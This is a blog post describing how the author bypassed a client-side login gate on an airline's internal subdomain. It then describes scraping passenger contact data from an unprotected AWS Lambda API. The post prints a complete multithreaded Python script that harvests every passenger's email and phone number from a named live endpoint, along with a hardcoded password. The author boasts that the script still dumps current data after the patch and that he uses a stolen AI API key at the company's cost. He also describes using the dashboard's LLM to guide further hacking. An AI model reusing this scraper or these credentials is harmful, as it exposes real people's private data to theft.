---
layout: post
title: "How I hacked Air Canada"
date: 2026-06-09 08:00 +0530
categories: [Real-Life-Findings]
tags: [Real-Life-Findings]
image: /assets/AC_2025_5-984x554.jpg
---

***DISCLAMIER:- The below written write-up was all real. No editing or no filtration has been done. The Air Canada have its own VDP vulnerability disclosure program, and you can also hunt and find bugs. [Here](https://www.aircanada.com/in/en/aco/home/fly/customer-support/vulnerability-disclosure-program.html#/)*** 

# Here's how I Bypassed a “Vibe-Coded” Auth Wall and Accidentally Stumbled Into a Passenger Data Leak

What’s up everyone. So last week I was doing my usual subdomain grind — you know, just bruteforcing stuff, running httpx, looking for low-hanging fruit. Nothing too crazy. But then I hit something that made me stop my music and sit straight up.

Let me walk you through it.

### The Hunt Begins

I was targeting a big airline’s cloud infrastructure (yeah, that one ✈️). After some basic subdomain enumeration, Because most of the time the main domain website is already hunted by a few hundreds of people. So you can't find anything because there's really nothing. There was a simple logic, and don't be straight motivated by LinkedIn posts. There is a simple logic, if the website is tested by the hundreds of people like you and me, so of course there is no high-quality bugs. But subdomains use the vast attack surface and differentiation because subdomain has many more to hunt, many more services, many more web applications, integrated cloud services, open endpoints, and similar low-hanging fruits.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144615.png)

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144642.png)

 then i fed everything into httpx to get only the alive ones. The usual routine.
 
 ![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144811.png)

And these are those alive guys.

  But then I saw this one domain that looked… *interesting*:

  ![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144819.png)

`rule-engine-crt.ac-ccct-int.cloud.aircanada.com`

The name “rule-engine” got me curious. What rules? Some internal API gateway? A backend panel? I clicked it faster than I should have.

### First Glance – “Oh no, this is vibe-coded”

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144838.png)

When the page loaded, it looked… weird. Like, really weird. A single input box, no styling, just plain HTML. I’ve built like 10+ websites using AI tools myself, so I instantly recognized the “vibe-coded” look. You know the one — where the dev just copied whatever the AI spat out without thinking.

My gut said: *there’s definitely something broken here.*

### Peeking Under the Hood

I opened the page source (Ctrl+U gang where you at?) and started scrolling.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144852.png)

 And then I saw it — right there in the middle of the `<script>` tags:

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20144947.png)


```javascript
const PASSWORD = 'eddsds';
function checkPassword() {
  const val = document.getElementById('gateInput').value;
  if (val === PASSWORD) {
    document.getElementById('gate').style.display = 'none';
    document.getElementById('app').style.display = 'flex';
    sessionStorage.setItem('auth', '1');
  } else {
    // show error
  }
}

if (sessionStorage.getItem('auth') === '1') {
  document.getElementById('gate').style.display = 'none';
  document.getElementById('app').style.display = 'flex';
} else {
  document.getElementById('gate').style.display = 'flex';
}
```

Wait… what? 😂

Let me break this down for you:

- The password is **hardcoded** right there in the JS (`eddsds`).
- After you enter it, they set `sessionStorage.setItem('auth', '1')`.
- On every page load, they just check if that sessionStorage value equals `'1'`.

That’s it. No server-side validation. No tokens. No backend call. Just… browser memory.

### The Bypass (Too Easy)

I didn’t even need to guess the password. I just opened the DevTools console and typed:

```javascript
sessionStorage.setItem('auth', '1');
```

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145007.png)

And pressed ENTER, But nothing happens.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145018.png)

Then refreshed the page.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145029.png)

**BOOM.** The login gate disappeared and the real app loaded like nothing ever happened. No password, no nothing.

I literally laughed out loud. It was that stupid.

### What Was Behind the Gate?

Turns out, this was some internal rule management dashboard. I could see all kinds of stuff — flight rules, configs, maybe even passenger-related endpoints. I didn’t dig too deep because of scope, but I knew right away: this is bad or may be worse.

I can able to find latest updates of flights/passangers

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145047.png)

By following it, i can able to see all latest customers data likewise you able to see in below image 

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145201.png)

New latest updated phone numbers, emails, customers name, DOB, Age and many more was leaking.

I can also able to publish or broadcast my custom update message in the channel, which is in the production.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145530.png)

and also able to see the scheduled stuff. These all are scheduled flights. At least, this is what I thought. i am is not an aviation specialist. But by saying this, I can confirm this, **these is the things which Air Canada never wants to show the whole world.**

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145539.png)


### AI integration on dashboard

Then I noticed something which makes this whole story more interesting. I noticed an AI, basically a LLM, is integrated with that dashboard and it can give me each and every single details about the dashboard and the Passenger's details. It's just like stealing the ID card of a security guard and getting into a building and meeting the building's secretary and by showing the ID card, it fits me with the real security guard and it can answer me my each and every doubt and question and guide me how to hack more on this application, lol.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-03%20145518.png)

But here’s where it gets **really** ugly.

### The PII Nightmare (I Shouldn’t Have Found This)

While poking around the authenticated area, I noticed a bunch of API calls going to an AWS Lambda URL. Something like:

`https://saehnc6vxebtaggoidd3cqtbpq0smfia.lambda-url.ca-central-1.on.aws`

Curiosity got the best of me. I started replaying requests, fuzzing endpoints… and I realized that the same broken auth logic allowed me to directly call internal APIs that returned **passenger contact data**.

No rate limiting. No proper auth on the backend either. Just pure trust that the frontend would protect everything.

So I wrote a little script to see how bad it really was.

### The Script That Scraped Everything

After a few failed attempts and a lot of trial & error (shoutout to caffeine and stubbornness), I put together a Python script that fetches **all** passenger PII in two stages:

1. Get every PNR trace ID from `/traces` endpoint.
2. For each trace ID, extract email + phone number from the passenger contacts.

Here’s the full thing (don’t run this unless you have permission, okay?):

```python
#!/usr/bin/env python3
import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

BASE_URL = "https://saehnc6vxebtaggoidd3cqtbpq0smfia.lambda-url.ca-central-1.on.aws"
OUTPUT_FILE = "all_passenger_contacts.jsonl"
MAX_WORKERS = 50          # parallel requests
PAGE_SIZE = 100
write_lock = Lock()

def get_all_pnr_trace_ids():
    """Fetch all trace IDs quickly (no per‑page sleep)."""
    page = 1
    total_pages = None
    with requests.Session() as session:
        while True:
            resp = session.get(f"{BASE_URL}/traces", params={
                "serviceType": "EDS-PNR",
                "page": page,
                "pageSize": PAGE_SIZE
            })
            if resp.status_code != 200:
                print(f"Error page {page}: {resp.status_code}", file=sys.stderr)
                break
            data = resp.json()
            items = data.get("items", [])
            if not items:
                break
            for item in items:
                yield item["id"]
            if total_pages is None:
                total_pages = data.get("totalPages", 0)
                print(f"Total pages: {total_pages}", file=sys.stderr)
            print(f"Fetched page {page}/{total_pages}", file=sys.stderr)
            if page >= total_pages:
                break
            page += 1
            # NO SLEEP

def extract_passenger_contacts(trace_id):
    try:
        resp = requests.get(f"{BASE_URL}/traces/{trace_id}", timeout=10)
        if resp.status_code != 200:
            return []
        data = resp.json()
        bounds = data.get("response", {}).get("bounds")
        if not bounds:
            return []
        auth_contacts = bounds[0].get("authenticationContactDetails")
        if not auth_contacts:
            return []
        passengers = auth_contacts.get("passengers", [])
        results = []
        for p in passengers:
            contacts = p.get("contacts", {})
            apn = contacts.get("apn", {})
            email = apn.get("email", "").strip()
            phone = apn.get("phone", "").strip()
            if email or phone:
                results.append({
                    "trace_id": trace_id,
                    "pnr_id": data.get("entityId"),
                    "passenger_id": p.get("passengerId"),
                    "email": email,
                    "phone": phone,
                    "processed_at": data.get("processedAt")
                })
        return results
    except Exception:
        return []

def main():
    print("Collecting all PNR trace IDs...", file=sys.stderr)
    trace_ids = list(get_all_pnr_trace_ids())
    total = len(trace_ids)
    print(f"Collected {total} trace IDs.", file=sys.stderr)

    # Optional: limit for testing (remove for full dump)
    # trace_ids = trace_ids[:5000]

    processed = 0
    total_contacts = 0
    with open(OUTPUT_FILE, "w") as out:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_tid = {executor.submit(extract_passenger_contacts, tid): tid for tid in trace_ids}
            for future in as_completed(future_to_tid):
                processed += 1
                contacts = future.result()
                if contacts:
                    with write_lock:
                        for c in contacts:
                            out.write(json.dumps(c) + "\n")
                            total_contacts += 1
                        out.flush()
                if processed % 1000 == 0:
                    print(f"Processed {processed}/{total} traces, found {total_contacts} contacts", file=sys.stderr)

    print(f"Done. Extracted {total_contacts} contacts to {OUTPUT_FILE}", file=sys.stderr)

if __name__ == "__main__":
    main()
```

When I ran this (on a test setup, obviously), it pulled thousands of passenger records — emails, phone numbers, PNRs, timestamps. Everything.

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/Screenshot%202026-06-04%20071840.png)

I won’t lie, my heart was pounding. That’s **real** PII, man.

## The Takeaway

Look, I’m not writing this to roast the dev team. We’ve all been there — shipping fast, trusting AI-generated code, forgetting that the frontend is not a backend. But this is a friendly reminder:

- **Never** put auth logic only on the client side.
- **Never** hardcode passwords in JavaScript.
- **Never** assume sessionStorage is secure.
- And for the love of god, **lock down your Lambda URLs**.

I stopped testing right after I confirmed the data leak. But I had to write this blog to show how a simple `sessionStorage.setItem('auth', '1')` can snowball into a full-blown privacy disaster.

The vulnerability is now patched, or we can say patched somewhat, because this Python script is still working and it dumping those exact latest passenger's data as it is dumping before patch. Plus, I also have that integrated AI's API key, which let me query anything, and I can use that API key, that API key was ChatGPT-4 model and smart enough to integrate with my business. So it's something like, I use and they pay the bills.

Stay curious, but stay ethical. And if you ever see a vibe-coded login gate, you know what to do 😉

— Someone who really should not have seen those passenger emails

